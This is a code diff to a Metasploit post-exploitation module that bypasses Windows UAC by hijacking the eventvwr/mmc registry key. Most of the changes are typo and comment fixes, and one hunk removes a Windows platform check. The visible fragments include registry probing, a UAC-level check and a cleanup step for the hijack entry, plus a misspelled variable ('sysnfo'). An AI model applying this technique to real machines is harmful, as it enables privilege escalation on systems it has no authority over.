@@ -65,7 +65,7 @@
 # msf post(enigma_fileless_uac_bypass) > exploit
 #
 # [ HINT ]
-# In some linux distributions postgresql need to be started and
+# In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
 # 1 - /etc/init.d/postgresql start
 # 2 - msfdb delete (optional)
@@ -113,7 +113,7 @@ class MetasploitModule < Msf::Post
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln dicover : enigma0x3 | mattifestation', # credits
+                                        'Vuln discover : enigma0x3 | mattifestation', # credits
                                 ],
  
                         'Version'        => '$Revision: 1.5',
@@ -161,8 +161,8 @@ class MetasploitModule < Msf::Post
 
 
 
-#TODO: check IF 'set use_powershell true' works (if reg key added)
-#TODO: check IF UAC set to dword 2 (always notify) will abort module execution
+# check IF 'set use_powershell true' works (if reg key added)
+# check IF UAC set to dword 2 (always notify) will abort module execution
 # -------------------------------------------------------
 # GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
 # -------------------------------------------------------
@@ -192,7 +192,7 @@ def ls_stage1
     # search in target regedit if eventvwr calls mmc.exe
     print_warning("Reading proccess registry hive keys...")
     Rex::sleep(1.0)
-    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command") # mmc.exe call registry key
+    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
       print_good("  exec => remote registry hive key found!")
       Rex::sleep(1.0)
     else
@@ -207,7 +207,8 @@ def ls_stage1
 
       # check target UAC settings (always notify - will abort module execution)
       check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
-      if check_success == 2 # a dword:2 value it means 'always notify' setting is active.
+      # a dword:2 value it means 'always notify' setting is active.
+      if check_success == 2
         print_warning("Target UAC set to: always notify")
         print_error("[ABORT]: module can not work under this condictions...")
         print_error("Remote system its not vulnerable to the exploit code!")
@@ -253,7 +254,7 @@ end
 
 
 
-#TODO: check IF #{reg_clean} has sucessefuly deleted value in regedit
+# check IF #{reg_clean} has sucessefuly deleted value in regedit
 # ----------------------------------------------------
 # DELETE MALICIOUS REGISTRY ENTRY (proccess hijacking)
 # ----------------------------------------------------
@@ -414,15 +415,12 @@ def run
 
 
     #
-    # the 'def check' funtion that rapid7 requires to accept new modules.
+    # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check for proper operative system (windows)
-    if client.platform !~ /win32|win64/i
-      print_error("[ ABORT ]: This module only works againts windows systems!")
-      raise Rex::Script::completed
-    end
     # check for proper session (meterpreter)
+    # the non-return of sysinfo command reveals
+    # that we are not on a meterpreter session!
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
